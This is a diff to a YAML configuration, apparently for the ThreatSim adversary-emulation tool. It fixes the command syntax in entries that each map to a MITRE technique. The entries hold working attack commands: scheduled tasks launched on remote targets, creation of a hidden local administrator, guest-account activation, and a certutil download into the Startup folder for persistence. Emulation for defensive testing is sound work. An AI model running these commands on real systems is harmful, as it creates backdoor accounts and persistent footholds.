@@ -4,7 +4,7 @@ commands:
    scheduled_task_remote_1:
       remote: true
       id: scheduled_task_remote_1
-      command: 'cmd.exe \c at \\$target 00:00 /every:M,T,W,Th,F cmd /c C:\ThreatSim.bat'
+      command: 'cmd.exe /c at \\$target 00:00 /every:M,T,W,Th,F cmd /c C:\ThreatSim.bat'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -12,7 +12,7 @@ commands:
    scheduled_task_local_1:
       remote: false
       id: scheduled_task_local_1
-      command: 'cmd.exe \c at 00:00 /every:M,T,W,Th,F cmd /c C:\ThreatSim.bat'
+      command: 'cmd.exe /c at 00:00 /every:M,T,W,Th,F cmd /c C:\ThreatSim.bat'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -20,7 +20,7 @@ commands:
    add_local_admin_1:
       remote: false
       id: add_local_admin_1
-      command: 'cmd.exe \c net user threatsim /add & net localgroup Administrators threatsim /add'
+      command: 'cmd.exe /c net user threatsim /add & net localgroup Administrators threatsim /add'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -30,7 +30,7 @@ commands:
    add_local_user_1:
       remote: false
       id: add_local_admin_1
-      command: 'cmd.exe \c net user threatsim /add'
+      command: 'cmd.exe /c net user threatsim /add'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -38,7 +38,7 @@ commands:
    activate_guest_user_1:
       remote: false
       id: activate_guest_user_1
-      command: 'cmd.exe \c net user guest /active:yes'
+      command: 'cmd.exe /c net user guest /active:yes'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -97,7 +97,7 @@ commands:
    certutil_download_startup_item:
       remote: false
       id: certutil_download_startup_item
-      command: 'certutil -urlcache -f -split https://github.com/joeavanzato/ThreatSim/TODO ‘C:\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\threatsim.exe'
+      command: 'certutil -urlcache -f -split https://github.com/joeavanzato/ThreatSim/TODO "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\threatsim.exe"'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
